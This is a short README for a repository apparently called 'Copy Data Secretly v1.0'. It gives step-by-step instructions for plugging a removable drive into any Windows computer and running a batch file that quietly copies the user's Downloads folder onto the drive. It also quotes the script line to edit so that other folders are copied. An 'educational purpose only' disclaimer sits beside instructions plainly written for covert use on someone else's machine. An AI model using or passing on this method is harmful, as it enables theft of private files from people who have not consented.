# cds_v1.0
Copy Data Secretly v1.0

This repo is made for educational purpose only. I do not encourage the use of this with bad intentions.
A guide on how to copy all files from a user's "downloads" folder to your removable device.
1. Download the "files" folder and copy it on a removable device.
2. Plug the removable device in any windows device.
3. Run "launch.bat" located inside the files folder.
4. Wait for the time you expect files to be copied normally.


If you want to copy a specific folder then:
1. Open the "files" folder.
2. Right click on "file.bat", choose "edit with Notepad".
3. look for the line with code shown below.
```md
%backupcmd% "%USERPROFILE%\downloads" "%drive%\all"
```
4. replace the first part with the path to folder you want to copy.
